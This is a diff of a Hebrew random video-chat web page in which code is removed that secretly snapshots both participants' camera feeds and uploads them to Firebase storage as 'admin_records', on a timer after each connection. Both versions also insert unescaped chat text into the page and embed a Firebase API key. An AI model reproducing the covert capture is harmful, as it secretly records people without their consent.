@@ -3,96 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VideoApp - Full System</title>
+    <title>VideoApp - Omegle Style</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     
     <style>
-        * { box-sizing: border-box; touch-action: none; -webkit-user-select: none; }
-        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #000; margin: 0; color: white; height: 100vh; overflow: hidden; }
+        * { box-sizing: border-box; touch-action: none; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #fff; color: #000; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* סרגל עליון */
-        .header { position: absolute; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 15px; z-index: 100; pointer-events: none; }
-        .btn-ui { background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px 20px; border-radius: 25px; cursor: pointer; backdrop-filter: blur(10px); pointer-events: auto; font-weight: bold; }
+        /* כפתורי מערכת למעלה */
+        .ui-header { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
+        .btn-action { background: rgba(0,0,0,0.6); border: none; color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer; backdrop-filter: blur(5px); pointer-events: auto; font-weight: bold; font-size: 13px; }
         
-        /* תצוגת וידאו */
-        .main-view { display: flex; flex-direction: column; height: 100vh; width: 100vw; background: #000; }
-        .remote-area { flex: 1; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .local-area { height: 35%; background: #111; border-top: 1px solid #333; position: relative; }
+        /* אזור הוידאו - תופס את רוב המסך */
+        .video-section { height: 65vh; display: flex; flex-direction: column; background: #000; position: relative; }
+        .v-box { flex: 1; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #222; }
         video { width: 100%; height: 100%; object-fit: cover; }
         
-        /* הודעות מצב */
-        .home-overlay { text-align: center; color: #888; z-index: 5; transition: opacity 0.3s; }
-        .status-msg { color: #ff8000; font-weight: bold; display: none; text-align: center; }
+        /* שכבות מידע על הוידאו */
+        .label-tag { position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.5); color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px; }
+        .centered-msg { position: absolute; width: 100%; text-align: center; color: #555; font-size: 18px; z-index: 5; pointer-events: none; }
 
-        /* אינדיקטור צד שני */
-        .partner-info { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.7); padding: 5px 15px; border-radius: 20px; display: none; font-size: 14px; border: 1px solid rgba(255,255,255,0.2); }
-
-        /* צ'אט (Omegle Style) */
-        #chat-section { position: absolute; bottom: 35%; width: 100%; height: 160px; background: rgba(255,255,255,0.95); color: #000; display: none; flex-direction: column; z-index: 80; }
-        #messages-flow { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; }
-        .input-wrap { display: flex; border-top: 1px solid #ddd; }
-        .input-wrap input { flex: 1; border: none; padding: 12px; outline: none; background: transparent; }
+        /* צ'אט אומיגל - נמצא מתחת לוידאו */
+        #chat-container { height: 35vh; display: none; flex-direction: column; background: #f4f4f4; border-top: 1px solid #ccc; }
+        #msg-flow { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; background: white; }
+        .input-area { display: flex; padding: 8px; background: #eee; gap: 8px; }
+        .input-area input { flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 5px; outline: none; }
+        .send-btn { background: #ff8000; color: white; border: none; padding: 0 15px; border-radius: 5px; font-weight: bold; }
 
         /* מודאל פרופיל */
-        #profile-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 200; align-items: center; justify-content: center; }
-        .modal-inner { background: #fff; color: #333; padding: 30px; border-radius: 20px; width: 85%; max-width: 320px; }
-        
-        /* קנבס נסתר להקלטה עבור המנהל */
-        #recording-canvas { display: none; }
+        #profile-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 200; align-items: center; justify-content: center; }
+        .modal-body { background: white; padding: 20px; border-radius: 10px; width: 80%; max-width: 300px; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <button id="btn-profile" class="btn-ui" onclick="openProfile()">פרופיל 👤</button>
-    <button id="btn-report" class="btn-ui" style="background:rgba(231, 76, 60, 0.8); display:none;" onclick="handleReport()">דיווח</button>
-    <button class="btn-ui" onclick="flipCamera()">🔄</button>
+<div class="ui-header">
+    <button id="p-btn" class="btn-action" onclick="showP()">פרופיל 👤</button>
+    <button id="r-btn" class="btn-action" style="background:#d63031; display:none;" onclick="report()">דיווח</button>
+    <button class="btn-action" onclick="switchCam()">🔄</button>
 </div>
 
-<div class="main-view" id="swipe-container">
-    <div class="remote-area">
-        <div id="home-text" class="home-overlay">
-            <h2 style="margin:0">דף הבית</h2>
-            <p>גרור שמאלה כדי להתחיל <br> ⬅️</p>
-        </div>
-        
-        <div id="searching-text" class="status-msg">מחפש מישהו לדבר איתו...</div>
-        
+<div class="video-section" id="swipe-zone">
+    <div class="v-box">
+        <div id="hint-text" class="centered-msg">גרור שמאלה לחיפוש ⬅️</div>
+        <div id="search-text" class="centered-msg" style="display:none; color:#ff8000;">מחפש...</div>
         <video id="remoteVid" autoplay playsinline></video>
-        <div id="partner-tag" class="partner-info">הצד השני: <span id="partner-emoji"></span></div>
+        <div id="p-tag" class="label-tag" style="display:none;">הצד השני <span id="p-emoji"></span></div>
     </div>
     
-    <div class="local-area">
+    <div class="v-box">
         <video id="localVid" autoplay muted playsinline></video>
-        <div style="position:absolute; bottom:10px; right:10px; background:rgba(0,0,0,0.5); padding:2px 10px; border-radius:10px; font-size:12px;">אתה</div>
+        <div class="label-tag">אתה</div>
     </div>
 </div>
 
-<div id="chat-section">
-    <div id="messages-flow"></div>
-    <div class="input-wrap">
-        <input type="text" id="chatInp" placeholder="הקלד הודעה...">
-        <button onclick="sendMsg()" style="padding:0 20px; background:#ff8000; color:#fff; border:none; font-weight:bold;">שלח</button>
+<div id="chat-container">
+    <div id="msg-flow"></div>
+    <div class="input-area">
+        <input type="text" id="chatInp" placeholder="כתוב הודעה...">
+        <button class="send-btn" onclick="send()">שלח</button>
     </div>
 </div>
 
 <div id="profile-modal">
-    <div class="modal-inner">
-        <h3 style="margin-top:0">עריכת פרטים</h3>
-        <p style="font-size:12px; color:gray;">ניתן לשנות את השם בלבד</p>
-        <input type="text" id="new-name-inp" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:10px; margin-bottom:20px;">
-        <button onclick="saveNewName()" style="width:100%; padding:12px; background:#27ae60; color:#fff; border:none; border-radius:10px; font-weight:bold;">שמור</button>
-        <button onclick="closeProfile()" style="width:100%; margin-top:10px; background:none; border:none; color:gray;">ביטול</button>
+    <div class="modal-body">
+        <h3 style="margin-bottom:10px;">עריכת שם</h3>
+        <input type="text" id="name-inp" style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px;">
+        <button onclick="saveP()" style="width:100%; padding:10px; background:#2ecc71; border:none; color:white; border-radius:5px; font-weight:bold;">שמור</button>
+        <button onclick="hideP()" style="width:100%; margin-top:10px; border:none; background:none; color:gray;">ביטול</button>
     </div>
 </div>
 
-<canvas id="recording-canvas" width="640" height="480"></canvas>
-
 <script>
-    // הגדרות Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10",
       authDomain: "live-video-20fca.firebaseapp.com",
@@ -103,128 +87,92 @@
       databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com/"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const storage = firebase.storage();
 
-    let myStream, isSearching = false, isConnected = false, searchTimeout, facing = "user";
+    let stream, searching = false, connected = false, timer, dir = "user";
 
-    // אתחול מצלמה
-    async function startCam() {
-        if (myStream) myStream.getTracks().forEach(t => t.stop());
-        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
-        document.getElementById('localVid').srcObject = myStream;
+    async function init() {
+        if(stream) stream.getTracks().forEach(t => t.stop());
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: dir }, audio: true });
+        document.getElementById('localVid').srcObject = stream;
     }
 
-    // זיהוי גרירה (Swipe)
-    let touchX, touchY;
-    const zone = document.getElementById('swipe-container');
-    zone.addEventListener('touchstart', e => { touchX = e.touches[0].clientX; touchY = e.touches[0].clientY; });
-    zone.addEventListener('touchend', e => {
-        let dx = touchX - e.changedTouches[0].clientX;
-        let dy = touchY - e.changedTouches[0].clientY;
-        if (Math.abs(dx) > 70) dx > 0 ? startSearch() : goHome();
-        else if (Math.abs(dy) > 70) goHome();
+    // ניהול סוואיפ
+    let x0, y0;
+    document.getElementById('swipe-zone').addEventListener('touchstart', e => { x0 = e.touches[0].clientX; y0 = e.touches[0].clientY; });
+    document.getElementById('swipe-zone').addEventListener('touchend', e => {
+        let dx = x0 - e.changedTouches[0].clientX;
+        let dy = y0 - e.changedTouches[0].clientY;
+        if(Math.abs(dx) > 80) dx > 0 ? start() : goHome();
+        else if(Math.abs(dy) > 80) goHome();
     });
 
-    function startSearch() {
-        if (isConnected) resetAll();
-        isSearching = true;
-        document.getElementById('home-text').style.opacity = "0";
-        document.getElementById('btn-profile').style.display = "none";
-        document.getElementById('searching-text').style.display = "block";
+    function start() {
+        goHome();
+        searching = true;
+        document.getElementById('hint-text').style.display = "none";
+        document.getElementById('search-text').style.display = "block";
+        document.getElementById('p-btn').style.display = "none";
         
-        searchTimeout = setTimeout(() => {
-            if(isSearching) { alert("לא נמצא משתמש כרגע, חוזרים לבית"); goHome(); }
+        timer = setTimeout(() => {
+            if(searching) { alert("לא נמצא משתמש"); goHome(); }
         }, 30000);
 
-        // מדמה מציאת משתמש (בפועל יגיע מהשרת ב-Render)
-        setTimeout(() => { if(isSearching) connectPartner("נקבה"); }, 3000);
+        // דימוי חיבור (למטרת פיתוח הממשק)
+        setTimeout(() => { if(searching) onJoin("נקבה"); }, 3000);
     }
 
-    function connectPartner(gender) {
-        clearTimeout(searchTimeout);
-        isSearching = false; isConnected = true;
-        document.getElementById('searching-text').style.display = "none";
-        document.getElementById('partner-tag').style.display = "block";
-        document.getElementById('partner-emoji').innerText = (gender === "זכר") ? "👨" : "👩";
-        document.getElementById('chat-section').style.display = "flex";
-        document.getElementById('btn-report').style.display = "block";
-        
-        // כאן תתחיל פונקציית צילום אוטומטית למנהל (נסתרת)
-        startAdminRecording();
+    function onJoin(gender) {
+        clearTimeout(timer);
+        searching = false; connected = true;
+        document.getElementById('search-text').style.display = "none";
+        document.getElementById('p-tag').style.display = "block";
+        document.getElementById('p-emoji').innerText = (gender === "זכר") ? "👨" : "👩";
+        document.getElementById('chat-container').style.display = "flex";
+        document.getElementById('r-btn').style.display = "block";
     }
 
     function goHome() {
-        resetAll();
-        document.getElementById('home-text').style.opacity = "1";
-        document.getElementById('btn-profile').style.display = "block";
-        document.getElementById('btn-report').style.display = "none";
-        document.getElementById('chat-section').style.display = "none";
-        document.getElementById('partner-tag').style.display = "none";
-        document.getElementById('searching-text').style.display = "none";
-    }
-
-    function resetAll() {
-        clearTimeout(searchTimeout);
-        isSearching = isConnected = false;
+        clearTimeout(timer);
+        searching = connected = false;
+        document.getElementById('hint-text').style.display = "block";
+        document.getElementById('search-text').style.display = "none";
+        document.getElementById('p-btn').style.display = "block";
+        document.getElementById('r-btn').style.display = "none";
+        document.getElementById('chat-container').style.display = "none";
+        document.getElementById('p-tag').style.display = "none";
         document.getElementById('remoteVid').srcObject = null;
-        document.getElementById('messages-flow').innerHTML = "";
+        document.getElementById('msg-flow').innerHTML = "";
     }
 
     // פרופיל
-    function openProfile() {
+    function showP() {
         const p = JSON.parse(localStorage.getItem('myChatProfile'));
-        document.getElementById('new-name-inp').value = p.name;
+        document.getElementById('name-inp').value = p.name;
         document.getElementById('profile-modal').style.display = "flex";
     }
-    function saveNewName() {
+    function saveP() {
         const p = JSON.parse(localStorage.getItem('myChatProfile'));
-        p.name = document.getElementById('new-name-inp').value;
+        p.name = document.getElementById('name-inp').value;
         localStorage.setItem('myChatProfile', JSON.stringify(p));
-        closeProfile();
+        hideP();
     }
-    function closeProfile() { document.getElementById('profile-modal').style.display = "none"; }
+    function hideP() { document.getElementById('profile-modal').style.display = "none"; }
 
     // צ'אט
-    function sendMsg() {
-        const i = document.getElementById('chatInp');
-        if(!i.value) return;
-        const flow = document.getElementById('messages-flow');
-        flow.innerHTML += `<div><b style="color:#ff8000">אתה:</b> ${i.value}</div>`;
-        i.value = "";
+    function send() {
+        const inp = document.getElementById('chatInp');
+        if(!inp.value) return;
+        const flow = document.getElementById('msg-flow');
+        flow.innerHTML += `<div><b style="color:#ff8000">אתה:</b> ${inp.value}</div>`;
+        inp.value = "";
         flow.scrollTop = flow.scrollHeight;
     }
 
-    // דיווח
-    function handleReport() {
-        if(confirm("דווח על משתמש זה?")) {
-            db.ref('reports/').push({ reporter: JSON.parse(localStorage.getItem('myChatProfile')).name, time: Date.now() });
-            goHome();
-        }
-    }
+    function switchCam() { dir = (dir === "user") ? "environment" : "user"; init(); }
 
-    function flipCamera() { facing = (facing === "user") ? "environment" : "user"; startCam(); }
+    function report() { if(confirm("לדווח על המשתמש?")) goHome(); }
 
-    // פונקציית צילום למנהל (מצלמת פריים ושולחת ל-Firebase)
-    function startAdminRecording() {
-        const canvas = document.getElementById('recording-canvas');
-        const ctx = canvas.getContext('2d');
-        const v1 = document.getElementById('remoteVid');
-        const v2 = document.getElementById('localVid');
-
-        // צילום פריים בודד לדוגמה בכל שיחה (אפשר להפוך לוידאו בשרת)
-        setTimeout(() => {
-            if(!isConnected) return;
-            ctx.drawImage(v1, 0, 0, 320, 480);
-            ctx.drawImage(v2, 320, 0, 320, 480);
-            canvas.toBlob(blob => {
-                const ref = storage.ref(`admin_records/${Date.now()}.jpg`);
-                ref.put(blob);
-            }, 'image/jpeg');
-        }, 5000);
-    }
-
-    startCam();
+    init();
 </script>
 </body>
 </html>
